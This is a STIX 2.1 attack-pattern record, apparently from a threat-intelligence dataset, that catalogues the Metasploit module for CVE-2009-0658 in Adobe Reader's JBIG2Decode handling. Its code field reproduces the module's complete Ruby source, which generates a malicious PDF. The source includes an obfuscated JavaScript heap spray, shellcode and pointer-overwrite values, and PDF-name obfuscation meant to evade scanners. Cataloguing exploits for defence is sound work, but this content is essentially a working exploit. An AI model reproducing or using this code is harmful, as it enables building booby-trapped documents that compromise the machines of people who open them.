{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4f678e1d-594f-40c8-ad8f-0fc6c2c603ea",
    "created": "2024-08-14T16:36:34.705352Z",
    "modified": "2024-08-14T16:36:34.705355Z",
    "name": "Adobe JBIG2Decode Memory Corruption",
    "description": " This module exploits a heap-based pointer corruption flaw in Adobe Reader 9.0.0 and earlier. This module relies upon javascript for the heap spray.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/adobe_jbig2decode.rb",
            "external_id": "adobe_jbig2decode.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0658"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe JBIG2Decode Memory Corruption',\n      'Description'    => %q{\n          This module exploits a heap-based pointer corruption flaw in Adobe Reader 9.0.0 and earlier.\n          This module relies upon javascript for the heap spray.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          # Metasploit implementation\n          'natron',\n          # bl4cksecurity blog explanation of vuln [see References]\n          'xort', 'redsand',\n          # obfuscation techniques and pdf template from util_printf\n          'MC', 'Didier Stevens <didier.stevens[at]gmail.com>',\n        ],\n      'References'     =>\n        [\n          [ 'CVE' , '2009-0658' ],\n          [ 'OSVDB', '52073' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Adobe Reader v9.0.0 (Windows XP SP3 English)', { 'Ret' => 0x0166B550 } ], # Ret * 5 == 0x07018A90 (BIB.dll)\n          [ 'Adobe Reader v8.1.2 (Windows XP SP2 English)', { 'Ret' => 0x9B004870 } ], # Ret * 5 == 0x07017A30 (BIB.dll)\n        ],\n      'DisclosureDate' => '2009-02-19',\n      'DefaultTarget'  => 0))\n\n    register_options([\n      OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),\n    ])\n\n    end\n\n  def exploit\n    # Encode the shellcode.\n    shellcode \t\t= Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n    ptroverwrite \t= Rex::Text.to_unescape([target.ret].pack(\"V\"))\n\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n    # Randomize some variables\n    rand1\t= rand_text_alpha(rand(50) + 1)\n    rand2\t= rand_text_alpha(rand(50) + 1)\n    rand3\t= rand_text_alpha(rand(50) + 1)\n    rand4\t= rand_text_alpha(rand(50) + 1)\n    rand5\t= rand_text_alpha(rand(50) + 1)\n    rand6\t= rand_text_alpha(rand(50) + 1)\n    rand7\t= rand_text_alpha(rand(50) + 1)\n    rand8\t= rand_text_alpha(rand(50) + 1)\n    rand9\t= rand_text_alpha(rand(50) + 1)\n    rand10\t= rand_text_alpha(rand(50) + 1)\n    rand11\t= rand_text_alpha(rand(50) + 1)\n    rand12\t= rand_text_alpha(rand(50) + 1)\n    rand13\t= rand_text_alpha(rand(50) + 1)\n    rand14\t= rand_text_alpha(rand(50) + 1)\n    rand15\t= rand_text_alpha(rand(50) + 1)\n    rand16\t= rand_text_alpha(rand(50) + 1)\n\n    script = %Q|\n    var #{rand1} = \"\";\n    var #{rand2} = \"\";\n    var #{rand3} = unescape(\"#{shellcode}\");\n    var #{rand4} = \"\";\n\n    for (#{rand5}=128;#{rand5}>=0;--#{rand5}) #{rand4} += unescape(\"#{nops}\");\n    #{rand6} = #{rand4} + #{rand3};\n    #{rand7} = unescape(\"#{nops}\");\n    #{rand8} = 20;\n    #{rand9} = #{rand8}+#{rand6}.length\n    while (#{rand7}.length<#{rand9}) #{rand7}+=#{rand7};\n    #{rand10} = #{rand7}.substring(0, #{rand9});\n    #{rand11} = #{rand7}.substring(0, #{rand7}.length-#{rand9});\n    while(#{rand11}.length+#{rand9} < 0x40000) #{rand11} = #{rand11}+#{rand11}+#{rand10};\n    #{rand12} = new Array();\n    for (#{rand5}=0;#{rand5}<100;#{rand5}++) #{rand12}[#{rand5}] = #{rand11} + #{rand6};\n\n    for (#{rand5}=142;#{rand5}>=0;--#{rand5}) #{rand2} += unescape(\"#{ptroverwrite}\");\n    #{rand13} = #{rand2}.length + 20\n    while (#{rand2}.length < #{rand13}) #{rand2} += #{rand2};\n    #{rand14} = #{rand2}.substring(0, #{rand13});\n    #{rand15} = #{rand2}.substring(0, #{rand2}.length-#{rand13});\n    while(#{rand15}.length+#{rand13} < 0x40000) #{rand15} = #{rand15}+#{rand15}+#{rand14};\n    #{rand16} = new Array();\n    for (#{rand5}=0;#{rand5}<125;#{rand5}++) #{rand16}[#{rand5}] = #{rand15} + #{rand2};\n|\n    eaxptr\t\t= \"\\x00\\x20\\x50\\xff\" \t\t# CALL DWORD PTR DS:[EAX+20]\n    eaxp20ptr\t= \"\\x05\\x69\\x50\\x50\"\t\t# Shellcode location called by CALL DWORD PTR DS:[EAX+20]\n    modifier\t= \"\\x00\\x69\\x00\\x00\"\t\t# ECX values seen: 02004A00, 033C9F58, 0338A228, 031C51F8, 0337B418\n                # natron@kubuntu-nkvm:~$ ./pdf-calc-val.rb 0x690000\n                # EAX: 0x690000   ECX: 0x2004a00   WriteAddr: 0xa3449ec\n                # EAX: 0x690000   ECX: 0x358a228   WriteAddr: 0xb8ca214\n\n    jbig2stream\t= eaxptr + \"\\x40\\x00\" + modifier + eaxp20ptr\n\n    # Create the pdf\n    pdf = make_pdf(script, jbig2stream)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(pdf)\n  end\n\n  def random_non_ascii_string(count)\n    result = \"\"\n    count.times do\n      result << (rand(128) + 128).chr\n    end\n    result\n  end\n\n  def io_def(id)\n    \"%d 0 obj\" % id\n  end\n\n  def io_ref(id)\n    \"%d 0 R\" % id\n  end\n\n  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/\n  def n_obfu(str)\n    result = \"\"\n    str.scan(/./u) do |c|\n      if rand(3) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'\n        result << \"#%x\" % c.unpack(\"C*\")[0]\n      # Randomize the spaces and newlines\n      elsif c == \" \"\n        result << \" \" * (rand(3) + 1)\n        if rand(2) == 0\n          result << \"\\x0d\\x0a\"\n          result << \" \" * rand(2)\n        end\n      else\n        result << c\n      end\n    end\n    result\n  end\n\n  def ascii_hex_whitespace_encode(str)\n    result = \"\"\n    whitespace = \"\"\n    str.each_byte do |b|\n      result << whitespace << \"%02x\" % b\n      whitespace = \" \" * (rand(3) + 1)\n    end\n    result << \">\"\n  end\n\n  def make_pdf(js, jbig2)\n\n    xref = []\n    eol = \"\\x0d\\x0a\"\n    endobj = \"endobj\" << eol\n\n    pdf = \"%PDF-1.5\" << eol\n    pdf << \"%\" << random_non_ascii_string(4) << eol\n    xref << pdf.length\n    pdf << n_obfu(\" \") << io_def(1) << n_obfu(\" << /Type /Catalog /Outlines \") << io_ref(2) << n_obfu(\" /Pages \") << io_ref(3) << n_obfu(\" /OpenAction \") << io_ref(5) << \" >> \" << endobj\n    xref << pdf.length\n    pdf << n_obfu(\" \") << io_def(2) << n_obfu(\" << /Type /Outlines /Count 0 >> \") << endobj\n    xref << pdf.length\n    pdf << n_obfu(\" \") << io_def(3) << n_obfu(\" << /Type /Pages /Kids [ \") << io_ref(4) << n_obfu(\" \") << io_ref(7) << n_obfu(\" ] /Count 2 >> \") << endobj\n    xref << pdf.length\n    pdf << n_obfu(\" \") << io_def(4) << n_obfu(\" << /Type /Page /Parent \") << io_ref(3) << n_obfu(\" /MediaBox [0 0 612 792 ] >> \") << endobj\n    xref << pdf.length\n    pdf << n_obfu(\" \") << io_def(5) << n_obfu(\" << /Type /Action /S /JavaScript /JS \") + io_ref(6) + \" >> \" << endobj\n    xref << pdf.length\n\n    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js), rand(5)+4) # Add random 4-9 compression level\n    pdf << n_obfu(\" \") << io_def(6) << n_obfu(\" << /Length %s /Filter [ /FlateDecode /ASCIIHexDecode ] >>\" % compressed.length) << eol\n    pdf << \"stream\" << eol\n    pdf << compressed << eol\n    pdf << \"endstream\" << eol\n    pdf << endobj\n    xref << pdf.length\n\n    pdf << n_obfu(\" \") << io_def(7) << n_obfu(\" << /Type /Page /Parent \") << io_ref(3) << \" /Contents [ \" << io_ref(8) << \" ] >> \" << eol\n\n    xref << pdf.length\n    compressed = Zlib::Deflate.deflate(jbig2.unpack('H*')[0], rand(8)+1) # Convert to ASCII hex, then deflate using random 1-9 compression\n    pdf << n_obfu(\" \") << io_def(8) << n_obfu(\" << /Length %s /Filter [ /FlateDecode /ASCIIHexDecode /JBIG2Decode ] >> \" % compressed.length) << eol\n    pdf << \"stream\" << eol\n    pdf << compressed << eol\n    pdf << \"endstream\" << eol\n    pdf << endobj\n\n    xrefPosition = pdf.length\n    pdf << \"xref\" << eol\n    pdf << \"0 %d\" % (xref.length + 1) << eol\n    pdf << \"0000000000 65535 f\" << eol\n    xref.each do |index|\n      pdf << \"%010d 00000 n\" % index << eol\n    end\n    pdf << \"trailer\" << n_obfu(\"<< /Size %d /Root \" % (xref.length + 1)) << io_ref(1) << \" >> \" << eol\n    pdf << \"startxref\" << eol\n    pdf << xrefPosition.to_s() << eol\n    pdf << \"%%EOF\" << eol\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-02-19",
    "x_mitre_platforms": [
        "win'"
    ]
}